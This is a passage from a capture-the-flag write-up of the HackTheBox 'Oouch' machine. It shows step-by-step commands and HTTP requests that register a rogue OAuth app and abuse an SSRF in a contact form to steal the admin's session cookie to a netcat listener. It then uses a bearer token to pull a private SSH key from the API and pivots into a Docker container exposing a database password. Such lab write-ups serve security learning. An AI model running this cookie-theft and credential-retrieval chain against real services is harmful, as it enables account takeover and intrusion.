</blockquote>
<p>So there must be a place to register new application. Let’s make one more <code>gobuster</code> search to see if we can get this endpoint:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://authorization.oouch.htb:8000/oauth/applications&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[...]</span><br><span class="line">/997 (Status: 301)</span><br><span class="line">/999 (Status: 301)</span><br><span class="line">/99999999 (Status: 301)</span><br><span class="line">/register (Status: 301)</span><br></pre></td></tr></table></figure>

<p>We get a loooot of applications ID but also a <code>register/</code> endpoint! That’s exactly what we need.</p>
<p>This times the credentials are working and leads us to the following page:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/82034990-3caa9480-969f-11ea-961b-f05aed50754a.png" alt="oouch oauth app registration"></p>
<p>Let’s create our own <code>public</code> app with <code>Authorization type</code> set to <code>Authorization Code</code>. Don’t forget to not down the <code>Client ID</code> and <code>Client Secret</code> since we are going to need it later. Let’s set our own server as <code>Redirect uris</code> so we can easily monitor the requests later. Then save our app:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/82035623-0b7e9400-96a0-11ea-9e54-510ef5886477.png" alt="oouch oauth app register"></p>
<p>We can notice our application ID in the URL: <code>http://authorization.oouch.htb:8000/oauth/applications/2/</code>. Let’s note down that our ID is <code>2</code>.</p>
<p>Once again we are going to abuse the SSRF vulnerability. Sending our app link to the admin <code>qtc</code> will allow us to, thanks to the <code>Redirect Uri</code>, to have <code>qtc</code> redirected to our server with his admin cookie. </p>
<p>We now have to craft the right URL to let <code>qtc</code> connects to our application. Following the <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc6749#section-4.1.1">OAuth 2.0 documentation</a>, our link will be the following one:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://authorization.oouch.htb:8000/oauth/authorize?response_type=code&amp;client_id=MFtnpVvtUo13yfBwO33jCHcjNfkT8R7Kebg9QKFj&amp;client_secret=b4VGOv30ZpsQy1HOkRcRi5BaIyhsu00b7LZMw4SE9gFtygHXh3ngG54SjzZ0Kyf8SvH6m9Gfv6ISKh2k4YU582KP9bIlSz0Brz0Qz3vMns3eczMvm15kWagBjN5vbOKe&amp;redirect_uri=http://10.10.14.16:80/&amp;grant_type=authorization_code</span><br></pre></td></tr></table></figure>

<p>Now let’s have <code>qtc</code> open it… </p>
<p>Let’s give a try first to make sure our link is correct. First we need to open a simple web server on port 80, I will user <code>nc</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo nc -lvnp 80</span><br></pre></td></tr></table></figure>

<p>Now we open our authorization link:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/82037282-32d66080-96a2-11ea-87b9-30b6b9549cb7.png" alt="oouch oauth app authorize"></p>
<p>As soon as we select <code>Authorize</code> our web server receive datas including our session cookie:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo nc -lvnp 80</span><br><span class="line">Connection from 10.10.14.16:40250</span><br><span class="line">GET /?code=9LtdM21130p0V9vIFBRWhHVL0ogmMs HTTP/1.1</span><br><span class="line">Host: 10.10.14.16</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://authorization.oouch.htb:8000/oauth/authorize/?response_type=code&amp;client_id=MFtnpVvtUo13yfBwO33jCHcjNfkT8R7Kebg9QKFj&amp;client_secret=b4VGOv30ZpsQy1HOkRcRi5BaIyhsu00b7LZMw4SE9gFtygHXh3ngG54SjzZ0Kyf8SvH6m9Gfv6ISKh2k4YU582KP9bIlSz0Brz0Qz3vMns3eczMvm15kWagBjN5vbOKe&amp;redirect_uri=http://10.10.14.16:80/&amp;grant_type=authorization_code</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>So we validated that everything is in order. Let’s now use the SSRF by sending this link through the Contact page so it will be opened by <code>qtc</code>:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/82037690-c7d95980-96a2-11ea-97ec-cc029da2757c.png" alt="oouch oauth authorize SSRF"></p>
<p>And after a few tries (the box was quite unstable) we finally get the cookie:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo nc -lvnp 80</span><br><span class="line">Connection from 10.10.10.177:36596</span><br><span class="line">GET /?error=invalid_request&amp;error_description=Missing+response_type+parameter. HTTP/1.1</span><br><span class="line">Host: 10.10.14.16</span><br><span class="line">User-Agent: python-requests/2.21.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: sessionid=6lqzd97bobc8is2tl3xod702qnzondvb;</span><br></pre></td></tr></table></figure>

<p>Let’s go back to the authorization server and use Firefox/Chrome dev tools to replace our cookie with <code>qtc</code> one:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/82041031-ccecd780-96a7-11ea-9339-392370b65e09.png" alt="oouch authorization qtc cookie"></p>
<p>It works! We are logged-in as <code>qtc</code> on Authorization server as-well:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/82041094-e55cf200-96a7-11ea-8286-2b603d06eb82.png" alt="oouch authorization logged qtc"></p>
<h3 id="API-get-user-endpoint"><a href="#API-get-user-endpoint" class="headerlink" title="API get_user endpoint"></a>API get_user endpoint</h3><p>Now it’s time to access the <code>get_user</code> endpoint mentioned is <code>qtc</code> notes:</p>
<blockquote>
<p>/api/get_user -&gt; user data. oauth/authorize -&gt; Now also supports GET method.</p>
<p>o_auth_notes.txt </p>
</blockquote>
<p>First we need to retrieve <code>qtc</code> access token for the API. To do so we have to edit our application (<code>2</code>) to set the <code>Authorization grant type</code> to <code>Client credentials</code>:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/82045193-f9582200-96ae-11ea-9c83-a9184efcba4a.png" alt="oouch oauch client credentials"></p>
<p>Now we go back to <code>http://authorization.oouch.htb:8000/</code> with <code>qtc</code>.</p>
<p>According to the <a target="_blank" rel="noopener" href="https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/">OAuth 2.0 documentation</a>, we need to make a POST request on <code>/token</code> endpoint with app <code>Client ID</code> and <code>Client Secret</code> in order to retrieve a token. Let’s give a try:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/oauth/token/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>authorization.oouch.htb:8000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://authorization.oouch.htb:8000/</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sessionid=6lqzd97bobc8is2tl3xod702qnzondvb; csrftoken=jVilFO87MZeGcAB0yQVXUNhOiwABsLoX06SAakPXz1dUZz5pfWdeNbZA48NeVTxK</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>223</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">grant_type</span>=client_credentials&amp;client_id=MFtnpVvtUo<span class="number">13</span>yfBwO<span class="number">33</span>jCHcjNfkT<span class="number">8</span>R<span class="number">7</span>Kebg<span class="number">9</span>QKFj&amp;client_secret=b<span class="number">4</span>VGOv<span class="number">30</span>ZpsQy<span class="number">1</span>HOkRcRi<span class="number">5</span>BaIyhsu<span class="number">00</span>b<span class="number">7</span>LZMw<span class="number">4</span>SE<span class="number">9</span>gFtygHXh<span class="number">3</span>ngG<span class="number">54</span>SjzZ<span class="number">0</span>Kyf<span class="number">8</span>SvH<span class="number">6</span>m<span class="number">9</span>Gfv<span class="number">6</span>ISKh<span class="number">2</span>k<span class="number">4</span>YU<span class="number">582</span>KP<span class="number">9</span>bIlSz<span class="number">0</span>Brz<span class="number">0</span>Qz<span class="number">3</span>vMns<span class="number">3</span>eczMvm<span class="number">15</span>kWagBjN<span class="number">5</span>vbOKe</span></span><br></pre></td></tr></table></figure>

<p>And success! The app returns the token we need:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-store</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>116</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Authorization</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;access_token&quot;</span>: <span class="string">&quot;W4c7YMFgb3lrZLyfdYOMyxs3Fh89is&quot;</span>, <span class="attr">&quot;expires_in&quot;</span>: <span class="number">600</span>, <span class="attr">&quot;token_type&quot;</span>: <span class="string">&quot;Bearer&quot;</span>, <span class="attr">&quot;scope&quot;</span>: <span class="string">&quot;read write&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>Now we should be able to access the API using the access token we just got. Let’s give it a try:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&#x27;http://authorization.oouch.htb:8000/api/get_user?access_token=W4c7YMFgb3lrZLyfdYOMyxs3Fh89is&#x27;</span> -H <span class="string">&#x27;Cookie: sessionid=6lqzd97bobc8is2tl3xod702qnzondvb&#x27;</span> -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 87</span><br><span class="line">Vary: Authorization, Cookie</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;qtc&quot;</span>, <span class="string">&quot;firstname&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;lastname&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;qtc@nonexistend.nonono&quot;</span>&#125;% </span><br></pre></td></tr></table></figure>

<p>Good it worked! But we didn’t get a lot of new information here… </p>
<h3 id="Retrieving-qtc-SSH-key-through-API"><a href="#Retrieving-qtc-SSH-key-through-API" class="headerlink" title="Retrieving qtc SSH key through API"></a>Retrieving qtc SSH key through API</h3><p>Now we should have full admin access to the Oouch app, including the authorization server. Yet, we didn’t find information about <code>qtc</code> SSH key as mentioned in the <code>todo.txt</code> document. </p>
<blockquote>
<p>Chris mentioned all users could obtain my ssh key. Must be a joke…  </p>
</blockquote>
<p>After a lot of searches and trial I finally find the endpoint we are looking for using <code>ffuf</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ffuf -w ~/SecLists/Discovery/Web-Content/common.txt -u <span class="string">&quot;http://authorization.oouch.htb:8000/api/get_FUZZ?access_token=RsUDJoc9bGfx0bBTOrXIXmOzbYr6IM&quot;</span> -b <span class="string">&quot;sessionid=6lqzd97bobc8is2tl3xod702qnzondvb&quot;</span> -<span class="built_in">fc</span> 404</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.0-rc1</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://authorization.oouch.htb:8000/api/get_FUZZ?access_token=RsUDJoc9bGfx0bBTOrXIXmOzbYr6IM</span></span><br><span class="line"><span class="string"> :: Header           : Cookie: sessionid=6lqzd97bobc8is2tl3xod702qnzondvb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span></span><br><span class="line"><span class="string"> :: Filter           : Response status: 404</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sshadmin                [Status: 200, Size: 2708, Words: 12, Lines: 1]</span></span><br><span class="line"><span class="string">ssh                     [Status: 200, Size: 2708, Words: 12, Lines: 1]</span></span><br><span class="line"><span class="string">useradmin               [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">user_upload             [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userapp                 [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">usercontrols            [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">usercp                  [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">user                    [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">usercp2                 [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userinfo                [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userimages              [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userfiles               [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userdir                 [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userlist                [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userlogin               [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">usermanager             [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">userlog                 [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">usernames               [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">username                [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">usernote                [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">users                   [Status: 200, Size: 87, Words: 8, Lines: 1]</span></span><br><span class="line"><span class="string">:: Progress: [4594/4594] :: 176 req/sec :: Duration: [0:00:26] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>

<p>The <code>get_ssh</code> endpoint might seems obvious when reading this writeup but believe me it’s not :P </p>
<p>Let’s check this <code>get_ssh</code> endpoint:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&#x27;http://authorization.oouch.htb:8000/api/get_ssh?access_token=W4c7YMFgb3lrZLyfdYOMyxs3Fh89is&#x27;</span> -H <span class="string">&#x27;Cookie: sessionid=6lqzd97bobc8is2tl3xod702qnzondvb&#x27;</span> -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 2708</span><br><span class="line">Vary: Authorization, Cookie</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;ssh_server&quot;</span>: <span class="string">&quot;consumer.oouch.htb&quot;</span>, <span class="string">&quot;ssh_user&quot;</span>: <span class="string">&quot;qtc&quot;</span>, <span class="string">&quot;ssh_key&quot;</span>: <span class="string">&quot;-----BEGIN OPENSSH PRIVATE KEY-----\nb3Bl[...]QIDBA==\n-----END OPENSSH PRIVATE KEY-----&quot;</span>&#125;% </span><br></pre></td></tr></table></figure>

<p>Bingo! Let’s save it to file and try to login to the server using it on <code>qtc</code> account:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i qtcssh qtc@oouch.htb</span><br><span class="line">Linux oouch 4.19.0-8-amd64 <span class="comment">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64</span></span><br><span class="line">Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3</span><br><span class="line">qtc@oouch:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">qtc@oouch:~$ cat user.txt</span><br><span class="line">axxxxxxxxxxxxxxxxxxxxxxxxxxx5</span><br></pre></td></tr></table></figure>

<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p><code>qtc</code> home folder contains a <code>note.txt</code> file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:~$ cat .note.txt</span><br><span class="line">Implementing an IPS using DBus and iptables == Genius?</span><br></pre></td></tr></table></figure>

<p>As a reminder an <code>IPS</code> stand for Intrusion detection system, <code>iptables</code> is a firewall and <code>DBus</code> , according to its website:</p>
<blockquote>
<p>D-Bus is a message bus system, a simple way for applications to talk to  one another. In addition to interprocess communication, D-Bus helps  coordinate process lifecycle; it makes it simple and reliable to code a  “single instance” application or daemon, and to launch applications and  daemons on demand when their services are needed. </p>
<p><a target="_blank" rel="noopener" href="https://www.freedesktop.org/wiki/Software/dbus/">https://www.freedesktop.org/wiki/Software/dbus/</a></p>
</blockquote>
<p>I don’t know if it’s genius but definitely an original idea. Let’s move on.</p>
<h3 id="Accessing-Docker-Container"><a href="#Accessing-Docker-Container" class="headerlink" title="Accessing Docker Container"></a>Accessing Docker Container</h3><p>Another thing that catch the attention while doing recon is that we are hosting docker containers:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:~$ docker -v</span><br><span class="line">Docker version 19.03.5, build 633a0ea838</span><br><span class="line">qtc@oouch:~$ systemctl is-active docker</span><br><span class="line">active</span><br><span class="line">qtc@oouch:~$ ip a</span><br><span class="line">[...]</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default</span><br><span class="line">    link/ether 02:42:14:f2:20:5f brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: br-cc6c78e0c7d0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:c6:0b:4e:e1 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:c6ff:fe0b:4ee1/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<p>Probably used for hosting the Oouch apps. </p>
<p>Since we don’t belongs to group <code>docker</code> we can not access the containers this way. But we do have the <code>qtc</code> SSH keys, maybe we can connect to the containers using it.</p>
<p>We know that <code>docker</code> is running on <code>172.17.0.1/16</code> subnet and <code>172.18.0.1/16</code> let’s try to connect to one. </p>
<p>Manually  trying to connect with <code>qtc</code> on <code>172.17.0.1/16</code> doesn’t give any results, but on <code>172.18.0.1/16</code> we manage to connect on <code>172.18.0.5</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:~$ ssh -i ~/.ssh/id_rsa qtc@172.18.0.5</span><br><span class="line">The authenticity of host <span class="string">&#x27;172.18.0.5 (172.18.0.5)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:ROF4hYtv6efFf0CQ80jfB60uyDobA9mVYiXVCiHlhSE.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>172.18.0.5<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Linux aeb4525789d8 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">qtc@aeb4525789d8:~$</span></span><br></pre></td></tr></table></figure>

<p>Browsing through the docker container we stumbled across the source code of the consumer app, alongside some interesting informations like the database password:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:~$ <span class="built_in">cd</span> /code</span><br><span class="line">qtc@aeb4525789d8:/code$ ls</span><br><span class="line">Dockerfile       config.py    key         nginx.conf  requirements.txt  urls.txt</span><br><span class="line">authorized_keys  consumer.py  migrations  oouch       start.sh          uwsgi.ini</span><br><span class="line">qtc@aeb4525789d8:/code$ cat config.py</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line">class Config(object):</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql://qtc:clarabibi2019!@database.consumer.oouch.htb/Consumer&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = False</span><br><span class="line"></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) or <span class="string">&#x27;klarabubuklarabubuklarabubuklarabubu&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Let’s keep this information in mind for later, it will probably come useful. </p>
<p>Another interesting fact is that the app is running on <code>uwsgi</code>:</p>
<blockquote>
<p>uWSGI is a software application that “aims at developing a full stack for building hosting services”. It is named after the Web Server Gateway Interface (WSGI), which was the first plugin supported by the project.</p>
<p>uWSGI is often used for serving Python web applications in conjunction with web servers such as Cherokee and Nginx, which offer direct support for uWSGI’s native uwsgi protocol.</p>
<p><a target="_blank" rel="noopener" href="https://uwsgi-docs.readthedocs.io/en/latest/">https://uwsgi-docs.readthedocs.io/en/latest/</a></p>
</blockquote>
<p>Its configuration is also available in the folder:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/code$ cat uwsgi.ini</span><br><span class="line">[uwsgi]</span><br><span class="line">module = oouch:app</span><br><span class="line">uid = www-data</span><br><span class="line">gid = www-data</span><br><span class="line">master = <span class="literal">true</span></span><br><span class="line">processes = 10</span><br><span class="line">socket = /tmp/uwsgi.socket</span><br><span class="line">chmod-sock = 777</span><br><span class="line">vacuum = <span class="literal">true</span></span><br><span class="line">die-on-term = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">qtc@aeb4525789d8:/code$ cat start.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">service ssh start</span><br><span class="line">service nginx start</span><br><span class="line">uwsgi --ini 